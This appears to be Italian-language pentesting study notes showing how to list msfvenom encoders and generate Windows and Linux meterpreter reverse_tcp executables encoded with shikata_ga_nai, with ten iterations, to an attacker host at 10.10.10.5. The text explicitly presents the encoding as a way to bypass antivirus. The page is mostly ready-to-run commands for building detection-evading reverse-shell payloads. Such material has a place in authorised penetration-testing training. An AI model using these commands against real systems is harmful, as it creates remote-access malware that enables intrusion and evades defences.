# Encoding Payloads With Msfvenom

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

***

## Elencare gli encoders in msfvenom

```
msfvenom --list encoders
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>



Gli unici due encoders che hanno un Rank excellent sono:

* cmd/poweshell\_base64, utile per quando dobbiamo fare encoding di un codice Powershell
* x86/shikata\_ga\_nai, utile per encoding di payload windows e linux.

## Generare un payload con encoding con shikata\_ga\_nai

### Windows

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai -f exe > home/kali/Desktop/Windows_Payloads/encoded/x86.exe
// possiamo specificare il numero di iterazioni con -i
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > home/kali/Desktop/Windows_Payloads/encoded/x86.exe
```

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Con shikata ga nai possiamo fare encoding con una iterazione o con quante vogliamo, più iterazioni facciamo più è probabile bypassare un antivirus.

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Più di 10 iterazioni non aiuta molto a bypassare un antivirus, quindi 10 diciamo che è il massimo per capire se riusciamo a bypassare oppure no.

### Linux

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f elf > home/kali/Desktop/Linux_Payloads/encoded/x86.exe
```

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
